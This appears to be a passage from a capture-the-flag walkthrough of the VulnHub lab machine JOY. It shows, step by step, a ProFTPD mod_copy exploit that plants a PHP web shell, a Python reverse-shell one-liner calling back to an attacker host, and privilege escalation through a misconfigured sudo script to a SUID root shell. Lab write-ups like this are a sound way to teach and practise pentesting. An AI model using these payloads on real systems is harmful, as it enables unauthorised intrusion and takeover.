|_    Traffic stats: 3.59 Gb sent, 669.09 Mb received
| snmp-processes: 
SNIP
|     Name: dbus-daemon
|     Path: /usr/bin/dbus-daemon
|     Params: --system --address=systemd: --nofork --nopidfile --systemd-activation
|   366: 
|     Name: ModemManager
|     Path: /usr/sbin/ModemManager
|   367: 
|     Name: systemd-logind
|     Path: /lib/systemd/systemd-logind
|   369: 
|     Name: NetworkManager
|     Path: /usr/sbin/NetworkManager
|     Params: --no-daemon
|   370: 
|     Name: avahi-daemon
|     Path: avahi-daemon: running [JOY.local]
|   372: 
|     Name: rtkit-daemon
|     Path: /usr/lib/rtkit/rtkit-daemon
|   373: 
|     Name: accounts-daemon
|     Path: /usr/lib/accountsservice/accounts-daemon
|   374: 
|     Name: rsyslogd
|     Path: /usr/sbin/rsyslogd
|     Params: -n
|   386: 
|     Name: avahi-daemon
|     Path: avahi-daemon: chroot helper
|   405: 
|     Name: polkitd
|     Path: /usr/lib/policykit-1/polkitd
|     Params: --no-debug
|   423: 
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f
|   445: 
|     Name: dovecot
|     Path: /usr/sbin/dovecot
|   447: 
|     Name: anvil
|     Path: dovecot/anvil
|   448: 
|     Name: log
|     Path: dovecot/log
|   539: 
|     Name: mysqld
|     Path: /usr/sbin/mysqld
|   566: 
|     Name: dhclient
|     Path: /sbin/dhclient
|     Params: -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-enp0s17.pid -lf /var/lib/NetworkManager/dhclient-784d0bd9
|   567: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   686: 
|     Name: minissdpd
|     Path: /usr/sbin/minissdpd
|     Params: -i 0.0.0.0
|   695: 
|     Name: in.tftpd
|     Path: /usr/sbin/in.tftpd
|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick
SNIP

```
- `TCP/36969`
	- `--listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick`
	- nmap scan did not detect `TCP/36969`




# Initial Foothold


## TCP/21 (FTP)

1. Access FTP w/ anonymous account, check for write access
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot]
	└─# touch test
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot]
	└─# ftp $ip
	Connected to 192.168.110.26.
	220 The Good Tech Inc. FTP Server
	Name (192.168.110.26:root): anonymous
	331 Anonymous login ok, send your complete email address as your password
	Password:
	p230 Anonymous access granted, restrictions apply
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> put test
	local: test remote: test
	200 PORT command successful
	150 Opening BINARY mode data connection for test
	226 Transfer complete
	ftp> 
	```
	- We have write access
2. Download all files
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp]
	└─# wget -m --no-passive ftp://anonymous:anonymous@$ip #Download all
	```
3. View directory structure of downloaded files
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp]
	└─# tree -a 192.168.110.26/
	192.168.110.26/
	├── download
	│   └── .listing
	├── .listing
	└── upload
		├── directory
		├── .listing
		├── project_armadillo
		├── project_bravado
		├── project_desperado
		├── project_emilio
		├── project_flamingo
		├── project_indigo
		├── project_komodo
		├── project_luyano
		├── project_malindo
		├── project_okacho
		├── project_polento
		├── project_ronaldinho
		├── project_sicko
		├── project_toto
		├── project_uno
		├── project_vivino
		├── project_woranto
		├── project_yolo
		├── project_zoo
		└── reminder
	```
4. View downloaded files
	- `directory`
		![](Pasted%20image%2020220211190947.png)
		- This is patrick's home directory, while enumerating snmp earlier, we found out `TCP/36969 (TFTP)` is also hosting files in patrick's home directory
		- Therefore, we can access tftp & download all the files in patrick's home directory
	- Compiled the remaining files
		![](Pasted%20image%2020220211191126.png)
		- Could be used as a password list
5. Check for if ProFTPD is vulnerable to `CVE-2015-3306`
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot]
	└─# nc $ip 21
	220 The Good Tech Inc. FTP Server
	site cpfr /etc/passwd
	350 File or directory exists, ready for destination name
	site cpto /tmp/passwd
	250 Copy successful
	```
	- It is vulnerable
	- Most likely, we have to exploit this vulnerability to obtain RCE, possible ways to gain initial access
		1. We can upload a web shell via FTP (we have write access) & use the exploit to copy it into the web directory?
		2. We can copy some sensitive file to read?
	- Boxes that also exploits `ProFTPD 1.3.5`
		- TryHackMe: Kenobi
		- Vulnhub: [Symfonos2](https://yufongg.github.io/posts/Symfonos-2/#tcp21-ftp---proftpd-135-file-copy) 

## TCP/36969 (TFTP)
1. Extract filenames from `directory`
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp/192.168.110.26/upload]
	└─# cat directory | awk '{print $9}' > files.txt
	```
2. Create [script](https://unix.stackexchange.com/a/76429) to download all files
	```
	#!/bin/bash

	server="tftp://$2"

	while IFS= read -r path; do
		[[ "$path" =~ ^\ *$ ]] && continue
		dir="$(dirname "$path")"
		printf "GET %s => %s\n" "$path" "$dir"
		! [ -d "$dir" ] && mkdir -p "$dir"
		curl -o "$path" "$server/$path"
	done < "$1"
	```
3. Download all files via TFTP
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp/192.168.110.26/upload]
	└─# ./download.sh files.txt "192.168.110.26:36969"
	```
4. View directory structure of downloaded files
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot]
	└─# tree -a tftp/
	tftp/
	├── 1d1uQKIs2uhCqFuuSxLbX3pyHlEO0QbnVBnCcnadsZlKj8kobR1t37EWGBy8YNrv.txt
	├── 1m1TUvgw6cYXjKdz1nCheX2SYP09UoKqlWZTW3of4xuqFHXdMSlkHiYKmF5OCWav.txt
	├── 1the130tAehAswxzeSOHFab0TFNk6cub84kLDX33WIsjCRVf6TnuNMrnvxrU8NBu.txt
	├── 33X5s0oGoB5Y66cZrQCISaIghaDCOxJl8KVbwgZJ5pshYuqUFL1dfJvpXmHrcwms.txt
	├── 8DGfozhRLqasp1aK9MWkZGRfzLyXH8xIXurF8IiIgWAHMoLhR1hMHB0OhEIBtmXu.txt
	├── 8PlfboqM5ukLJWZJV14D8uqwASY3J8AmItXf9S2dxw9vSbUDC8B5cYlzkuxFthJe.txt
	├── 9hgGMK4tcsQzmxOWUZfcumpx4viPscuEXIT1bXoEvDBlp8mBMy5WDtNPQvBaL2jr.txt
	├── a3JQla0gkeV0dT6jq5oooAXGeJ2HltsHSnCZyVppYjA9zJ53AbfaZQHvSIyA0cx7.txt
	├── .bash_logout
	├── .bashrc
	├── BOT5HBZI7mxrXll6ct2oo73W5XEMiykMoFhSVKOzajakX6LQ8ki6nIn06AiLwecc.txt
	├── CeAdo7UVy7S1I5EQHW1MqsIAiLoD1e1wn8LPdb3W9rMOlaBZQ6gp56pqb1ggYFpK.txt
	├── cmKiT6e4TIsNTOmmYQpMG5vclQRcDuCLcyygLFnS7vnGokEL79JWyZIBlx4e6rtV.txt
	├── directory
	├── download.sh
	├── DRYD3YRHRsXKeIxah70yAGjNKIxcrjBfXGjaAqqofJx13txLb5aRg8mbLEoxuBjB.txt
	├── EnJ8qzNAOrXg8Ns7Ipvy9slK6rKLVuUvkjoc3q3gtwIuRXvxlhyatyrBUORTmg4K.txt
	├── files.txt
	├── GJsjHHmznLcMnMiWTOeQfUkEbrTF0syQcYPGkk9OU0Cu8CeeebpI2IOGcK0W0bCK.txt
	├── h6IDz1W1OOJIUohSfQXuh3whjocnd9UlYxLe7c2D1eM5HGowj6oE6VYJ3oDOT5oa.txt
	├── HfiUzWL2mRolOJ3VxHnbudDtUksNiU3ECDRDT0UndRJy4yDGEqPwmybxwmASZvyL.txt
	├── iC0RhXCjsEwWv9vjfyNUzr3Xt75PYaWOSl0g6vwS0K0UQmbADphHcWrRFyfhEUGx.txt
	├── In42GyS9nxvvy2xQ1jt5ssdKdde1CCV9xGgOAn5UxO9TMpPqiZxVk3YdPRVHByiK.txt
	├── isTQxmWmT8qCto8v6jjYI3BAIYhzetrdFfu6BKIdA1oQpogJjcWPv9Co9GTx1X6d.txt
	├── jA1LkzUhjM9rtDYJNfBiO5gOLi0UN1X1XCfTXO2eurrWvVcO68k4XCSPbAHfBg7N.txt
	├── JKhD9y51PfXuenf4rXgoyLrHwzO2FYkjyxRXRVwsZKG6AfFpydEFR3WaNOsiEZGX.txt
	├── jpGEu1MnUyXFhyMeVMKtWEXTMIeH7unA9V3NtfFfEDOKKEOhQxDQq8RAB2zAnnjV.txt
	├── ka3vPjQYpGznu6fnqkscT7OG3HQZBiurbP0NsLXsoZkj843ClN9oMeSys5sMl24U.txt
	├── kfYN2BelubtUE37bGHowYyOqVLxFZFw0eFp4FCQ97hWcFFikExPzDP8K464WbGxL.txt
	├── lGzJbS5e0qmDsQ1P1fMwuvGgW8C3INgi0pDmzeKzluuhdbKZ9pzlE11OkwMTNEag.txt
	├── LlaRVfVhbzRnqBLYpilAc65SLhcTayqn2YdNMdsNK99H7o1FdaGMF0UFOjvwltmW.txt
	├── NkxhR26r5dbt10QUFbuQDd3id7hGoM3KOwTKJC3Xx2d0Yjpti2k0Om5l4jpVyMqr.txt
	├── pLGvIRMFc5HPrAgFkarJyWF9U77vLbViAu0lEi7tlYQAJHBGs1nrYmUvVfzMBZlt.txt
	├── pMLeyn5GkLz4fO93Pp4ySYLgYB6WNrnGIoyUPP3QKdG9rFpKZkH7vm3KBenMuYSb.txt
	├── .profile
	├── qmv3ubkHxChZFaN0FIEvmqd3OgrfjORg19CnE0hgkcwKG5pGneCfoy0eAeaWMxHk.txt
	├── RDCUijKIMJlPncgBtdJch6Y8GB67aGk2rgFFl6K0MgSPtk0aCqOJ1Qz9Oa1JLTql.txt
	├── rxX5yTMKDxHnubaLAfCfBrd1XRhCutwqCunXqWRzqO7rqwD39c87gdGFPS6BEYy8.txt
	├── ShkajHsaB48w7toVamdTdIYpHSJbctz5NbWocJmPn0XATFHYq4uIEp3ORhvbl6Dn.txt
	├── sWTJ2r03rMJztAbUgpqkADMUXnc9iUlt6xHQFe09JOUtkHu7447DbOptjoxEjU0A.txt
	├── uk4w8KqUzr0SKmF9jROMclukfuSmtx5kTyDY9u6yZPZ3IVNV2kUlSUD7pwcIn4dF.txt
	├── V96NoMKHvgTU1fQTqZveRXu8DhM8RazBdI9sXzZDAzaWYFjoXrxvXJwq8xqZVBlN.txt
	├── version_control
	├── wEcU5AV4vjHnFSWjcw0Rw0fgxlQFjELCnNQ1qZWCQnQbbMrJMjCnrrEItZJcOSN4.txt
	├── Wkc6VTjrWCRuy1tv0zIQ1FSNmpC0KO1GS6McX8QlsrKzLbDr4ma5RFfOBjQZ2DIG.txt
	├── xAbSUxQBquplbdqAXSBsPdCEB9q0q7Z2ZzhsUKaQH4PqvIk3xEBsV4YnBhvjZX3a.txt
	├── Y3jUEXz8Ga8oc9qrEOY3tFqF4YvTTjKuZ1q49eTjjxxKIgfepKBdOTYQujc5j3hc.txt
	├── Y6aDd0TrnLPSByKsTQGnfWAjasv55SEWQmNIrXf3OpXZSyeoouvF3xTxOUxQwkEt.txt
	├── ypsWXH5trdtKSxZswckKp58XIVnZ70d74smd0U8dbEsHLzPzg3iSJGNruTpRQfEG.txt
	├── z2YCbnwBAysUcWJLWk812GdOIt3jpt6WRGucfxzImJlmFZ8FdCsfzndyjqN6qItf.txt
	├── zpraNtovt6tQbYIUebAQLXhKsV4izRLZOj3NIqhR50A5ZHNhcEXdtxtWPZDJJbhJ.txt
	└── ZsUbbJTgvZ1WMcgS2JrA11QjneeUOaDNAXkklrCLTHXv9UdAymqWVcCHyUlwAh2a.txt
	```
5. View downloaded files
	- Compiled 
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/tftp]
	└─# mkdir script
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/tftp]
	└─# mv files.txt download.sh directory script/ # We already know content of these files, move them away.
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/tftp]
	└─# cat * >> compiled.txt
	cat: script: Is a directory
	```
	![](Pasted%20image%2020220211193011.png)
		- `ProFTPd 1.3.5`
		- `/var/www/tryingharderisjoy`
		- We are able to insert a webshell into `/var/www/tryingharderisjoy` 

## TCP/21 (FTP) - ProFTPD 1.3.5 Exploit
1. Search exploits for `ProFTPd 1.3.5`
	
	| Exploit Title                                           | Path |
	| ------------------------------------------------------- | ---- |
	| ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.py     |
2.  Manual exploit
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/exploit]
	└─# nc $ip 21
	220 The Good Tech Inc. FTP Server
	site cpfr /proc/self/cmdline
	350 File or directory exists, ready for destination name
	site cpto <?php system($_GET["c"]);?>
	250 Copy successful
	site cpfr <?php system($_GET["c"]);?>
	350 File or directory exists, ready for destination name
	site cpto /var/www/tryingharderisjoy/web_shell.php
	250 Copy successful
	QUIT
	221 Goodbye.
	```
	- Created a webshell




## TCP/80 (HTTP) - Webshell
1. Execute commands
	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/exploit]
	└─# curl http://192.168.110.26/web_shell.php?c=id
	proftpd: 192.168.110.4:47940: SITE cpto uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
	```
2. Obtain a www-data shell
	```
	# Enter this in your web browser
	192.168.110.26/web_shell.php?c=python+-c+'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.110.4",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
	```
	![](Pasted%20image%2020220211202415.png)
	![](Pasted%20image%2020220211202212.png)


# Privilege Escalation

## Patrick - Via Creds Found
1. Found credentials at `/ossec/patricksecretsofjoy`
	```
	patrick@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy 
	credentials for JOY:
	patrick:apollo098765
	root:howtheheckdoiknowwhattherootpasswordis

	how would these hack3rs ever find such a page?
	```
2. Switch to patrick w/ patrick:apollo098765
	![](Pasted%20image%2020220211203155.png)


## Root - Via Sudo 
1. Check for sudo access
	``` 
	patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l
	Matching Defaults entries for patrick on JOY:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User patrick may run the following commands on JOY:
		(ALL) NOPASSWD: /home/patrick/script/test
	patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
	```
2. The script allows user to specify a file/directory to change permission, we can exploit it by changing the permission of the entire `/home/patrick/script/` directory into world writable, readable and executable.
3. Exploit by changing permission of `/home/patrick/script/`
	```
	patrick@JOY:~$ sudo /home/patrick/script/test
	I am practising how to do simple bash scripting!
	What file would you like to change permissions within this directory?
	../script
	What permissions would you like to set the file to?
	777
	Currently changing file permissions, please wait.
	Tidying up...
	Done!
	patrick@JOY:~$ cd script
	```
4. Replace `test` w/ bash script to create a root shell
	```
	patrick@JOY:~/script$ rm test
	patrick@JOY:~/script$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > test; chmod 4777 test;
	```
5. Obtain root shell
	``` 
	patrick@JOY:~/script$ /tmp/rootbash -p
	```
	![](Pasted%20image%2020220211203950.png)

6. Root Flag

	```
	rootbash-4.4# cat proof.txt 
	Never grant sudo permissions on scripts that perform system functions!
	rootbash-4.4# 

	Thanks for joining us!

	If you have not rooted MERCY, DEVELOPMENT, BRAVERY, TORMENT, please root them too!

	This will conclude the series of five boxes on Vulnhub for pentesting practice, and once again, these were built while thinking about OffSec in mind. :-)

	For those who have helped made videos on rooting these boxes, I am more than grateful for your support. This means a lot for the box creator and those who have helped test these boxes. A shoutout to the kind folk from Wizard Labs, Zajt, as well as friends in the local security community which I belong to.

	If you found the boxes a good learning experience, feel free to share them with your friends.

	As of the time of writing, I will be working on (building) some boxes on Wizard-Labs, in a similar flavour to these boxes. If you enjoyed these, consider pinging them and their project. I think their lab is slowly being built into a nice lab with a variety of machines with good learning value.

	I was rather glad someone found me on Linkedin after breaking into these boxes. If you would like to contact the author, you can find some of the author's contact points on his website (https://donavan.sg).

	May the r00t be with you.

	P.S. Someone asked me, also, about "shesmileslikeabrightsmiley". Yes, indeed, she smiles like a bright smiley. She makes me smile like a bright smiley too? :-)
	rootbash-4.4# 
	```



